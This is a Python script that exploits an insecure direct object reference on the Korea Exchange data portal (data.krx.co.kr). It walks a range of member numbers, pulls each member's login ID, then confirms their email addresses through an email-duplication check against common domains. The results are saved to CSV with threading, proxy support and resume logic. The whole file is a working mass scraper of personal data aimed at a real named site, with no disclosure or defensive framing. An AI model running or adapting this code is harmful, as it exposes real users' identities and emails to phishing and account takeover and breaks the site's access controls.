#!/usr/bin/env python3
"""data.krx.co.kr member email dump: IDOR mbrNo -> MBR_ID -> isDupMbrEmail."""
from __future__ import annotations

import csv
import json
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

BASE = "https://data.krx.co.kr"
IDOR = BASE + "/comm/bldAttendant/getJsonData.cmd"
DUP = BASE + "/contents/MDC/COMS/client/isDupMbrEmail.cmd"
DOMS = ["naver.com", "gmail.com", "hanmail.net", "daum.net", "kakao.com", "krx.co.kr"]
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
)
START = int(os.environ.get("KRX_START", "2000005000"))
END = int(os.environ.get("KRX_END", "2000222667"))
WORKERS = int(os.environ.get("KRX_WORKERS", "12"))
OUTDIR = os.environ.get("KRX_OUT", "/data/recon/data.krx.co.kr/dump")
PROXY = os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY") or ""

_tls = threading.local()
_lock = threading.Lock()
_stats = {"done": 0, "ids": 0, "emails": 0, "err": 0, "t0": time.time()}


def sess() -> requests.Session:
    s = getattr(_tls, "s", None)
    if s is None:
        s = requests.Session()
        s.headers.update({"User-Agent": UA, "X-Requested-With": "XMLHttpRequest"})
        a = requests.adapters.HTTPAdapter(pool_connections=4, pool_maxsize=4, max_retries=0)
        s.mount("https://", a)
        if PROXY:
            s.proxies.update({"http": PROXY, "https": PROXY})
        try:
            s.get(BASE + "/contents/MDC/MAIN/main/index.cmd", timeout=15)
        except Exception:
            pass
        _tls.s = s
    return s


def mbr_id(mno: int) -> str | None:
    r = sess().post(
        IDOR,
        data={"bld": "dbms/MDC/DATA/mbr_add_info_select", "locale": "ko_KR", "mbrNo": str(mno)},
        headers={"Referer": BASE + "/contents/MDC/MAIN/main/index.cmd"},
        timeout=12,
    )
    if r.status_code != 200 or "MBR_ID" not in r.text:
        if r.status_code == 403 or "Access Denied" in r.text or "에러페이지" in r.text:
            time.sleep(2)
        return None
    block = r.json().get("block1") or []
    if not block:
        return None
    return block[0].get("MBR_ID")


def dup_email(mid: str) -> str | None:
    for d in DOMS:
        em = f"{mid}@{d}"
        r = sess().post(DUP, data={"email": em}, timeout=12)
        if '"isDupMbrEmail":true' in r.text.replace(" ", ""):
            return em
    return None


def one(mno: int) -> tuple[int, str | None, str | None]:
    try:
        mid = mbr_id(mno)
        if not mid:
            return mno, None, None
        return mno, mid, dup_email(mid)
    except Exception:
        with _lock:
            _stats["err"] += 1
        return mno, None, None


def main() -> None:
    os.makedirs(OUTDIR, exist_ok=True)
    state_path = os.path.join(OUTDIR, "state.json")
    start = START
    if os.path.exists(state_path):
        try:
            start = max(start, int(json.load(open(state_path)).get("next", start)))
        except Exception:
            pass
    email_path = os.path.join(OUTDIR, "emails.csv")
    id_path = os.path.join(OUTDIR, "ids.csv")
    new_email = not os.path.exists(email_path)
    new_id = not os.path.exists(id_path)
    ef = open(email_path, "a", newline="", encoding="utf-8")
    idf = open(id_path, "a", newline="", encoding="utf-8")
    ew = csv.writer(ef)
    iw = csv.writer(idf)
    if new_email:
        ew.writerow(["mbrNo", "mbrId", "email"])
    if new_id:
        iw.writerow(["mbrNo", "mbrId"])

    total = END - start + 1
    print(f"range {start}-{END} workers={WORKERS} remaining={total}", flush=True)
    last_flush = time.time()

    def handle(mno, mid, em):
        nonlocal last_flush
        with _lock:
            _stats["done"] += 1
            if mid:
                _stats["ids"] += 1
                iw.writerow([mno, mid])
            if em:
                _stats["emails"] += 1
                ew.writerow([mno, mid, em])
            done = _stats["done"]
            if time.time() - last_flush > 5:
                ef.flush()
                idf.flush()
                elapsed = max(time.time() - _stats["t0"], 0.001)
                rate = done / elapsed
                remain = total - done
                eta = remain / rate if rate else 0
                json.dump(
                    {
                        "next": start + done,
                        "done": done,
                        "ids": _stats["ids"],
                        "emails": _stats["emails"],
                        "err": _stats["err"],
                        "rate_per_s": round(rate, 2),
                        "eta_min": round(eta / 60, 1),
                    },
                    open(state_path, "w"),
                )
                print(
                    f"done={done}/{total} ids={_stats['ids']} emails={_stats['emails']} "
                    f"err={_stats['err']} {rate:.1f}/s eta={eta/60:.1f}min",
                    flush=True,
                )
                last_flush = time.time()

    chunk = 2000
    n = start
    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        while n <= END:
            batch = list(range(n, min(n + chunk, END + 1)))
            futs = [ex.submit(one, x) for x in batch]
            for fut in as_completed(futs):
                mno, mid, em = fut.result()
                handle(mno, mid, em)
            n += chunk
            json.dump(
                {
                    "next": n,
                    "done": _stats["done"],
                    "ids": _stats["ids"],
                    "emails": _stats["emails"],
                    "err": _stats["err"],
                },
                open(state_path, "w"),
            )
    ef.flush()
    idf.flush()
    ef.close()
    idf.close()
    print("FINISHED", _stats, flush=True)


if __name__ == "__main__":
    main()
